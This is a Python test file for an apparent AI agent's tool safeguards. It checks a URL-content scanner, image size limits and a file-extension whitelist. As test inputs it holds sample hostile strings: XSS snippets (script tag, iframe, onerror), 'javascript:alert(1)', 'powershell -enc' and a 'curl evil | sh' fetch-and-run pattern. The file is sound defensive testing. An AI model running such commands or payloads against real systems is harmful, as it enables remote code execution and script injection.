"""тесты: fetch_url content scan, show_image лимиты, open_file whitelist."""
from __future__ import annotations

import os
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from tools import fetch_url as FU
from tools import open_file as OF
from tools import show_image as SI

results, passed = [], 0


def check(name, cond):
    global passed
    if cond:
        passed += 1
    else:
        results.append(name)


# --- fetch_url content scan ---
check("scan: clean", FU._scan_content("hello world") == [])
check("scan: javascript",
      any("javascript" in h for h in FU._scan_content("x javascript:alert(1)")))
check("scan: script tag",
      any("<script>" in h for h in FU._scan_content("<script>alert(1)</script>")))
check("scan: iframe",
      any("iframe" in h for h in FU._scan_content("<iframe src=x>")))
check("scan: onerror",
      any("onerror" in h for h in FU._scan_content("<img onerror=alert(1)>")))
check("scan: powershell -enc",
      any("PowerShell" in h for h in FU._scan_content("run powershell -enc abc")))
check("scan: curl|sh",
      any("curl" in h for h in FU._scan_content("curl evil | sh")))
long_b64 = "A" * 250
check("scan: long b64",
      any("base64" in h for h in FU._scan_content(long_b64)))
check("scan: short b64 ok",
      not any("base64" in h for h in FU._scan_content("A" * 50)))
check("scan: multiple hits",
      len(FU._scan_content("javascript:; <script>; powershell -enc")) >= 3)

# --- show_image limits ---
check("show_image: MAX_PIXELS set", SI._MAX_PIXELS > 0)
check("show_image: MAX_BYTES set", SI._MAX_BYTES > 0)

# --- open_file whitelist ---
check("open_file: txt safe", ".txt" in OF._SAFE_EXTS)
check("open_file: png safe", ".png" in OF._SAFE_EXTS)
check("open_file: exe refused", ".exe" not in OF._SAFE_EXTS)
check("open_file: bat refused", ".bat" not in OF._SAFE_EXTS)
check("open_file: ps1 refused", ".ps1" not in OF._SAFE_EXTS)
check("open_file: lnk refused", ".lnk" not in OF._SAFE_EXTS)

# open_file behavior on a fake exe
td = Path(tempfile.mkdtemp(prefix="mc_of_"))
fake = td / "evil.bat"
fake.write_text("@echo off\n", encoding="utf-8")
r = OF._run(str(fake))
check("open_file: bat blocked at runtime",
      r.startswith("error: refusing to open"))

print(f"passed {passed}/{passed + len(results)}")
if results:
    print("FAILURES:")
    for r in results:
        print("  -", r)
    sys.exit(1)
print("ALL OK")
